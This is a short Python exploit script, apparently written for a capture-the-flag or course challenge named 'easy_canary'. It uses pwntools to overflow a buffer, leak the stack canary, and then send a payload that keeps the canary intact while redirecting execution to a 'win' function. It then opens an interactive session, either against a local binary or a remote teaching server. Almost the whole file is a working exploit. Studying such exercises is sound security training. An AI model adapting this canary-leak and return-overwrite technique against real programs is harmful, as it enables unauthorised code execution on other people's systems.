# Install pip3 and pwntools:
# sudo apt install python3-pip; pip3 install --user pwntools
# Here's a example script for this challenge:

from pwn import *
import sys

local = True

argv = sys.argv

if local:
	r = process("./easy_canary")
else:
	r = remote("tpas.alunos.dcc.fc.up.pt", 5007)

s = r.recvuntil(b"> ")

r.sendline(b"1") 

s = r.recvuntil(b"Name: ")

bon = int(argv[1])
ofn = int(argv[2])
coff = int(argv[3])
canb = int(argv[4])

#print(bon)

elf = ELF("./easy_canary")
win_function = p64(elf.symbols["win"])

print('Win_function => {}'.format(hex(int.from_bytes(win_function, 'little'))))

buffer_overflow_payload = b"A" * bon

#print(len(buffer_overflow_payload)) 

r.sendline(buffer_overflow_payload)

s = r.recvuntil(b"> ")

r.sendline(b"2")

#s = r.recvuntil(buffer_overflow_payload)

r.recv(bon + 14)

s = r.recv(canb)

for x in s:
    print(x)

i = int.from_bytes(s, 'little')

canary = p64(i -  0xa)

print('Canary => {}'.format(hex(int.from_bytes(canary, 'little'))))

win_exec_payload = buffer_overflow_payload + canary + (b'B' * ofn) + win_function

print(win_exec_payload)

s = r.recvuntil(b"> ")

r.sendline(b"1")

s = r.recvuntil(b"Name: ")

r.sendline(win_exec_payload)

#s = r.recvuntil(b"> ")

#r.sendline(b"ls")

#print(r.recvline())

r.interactive()
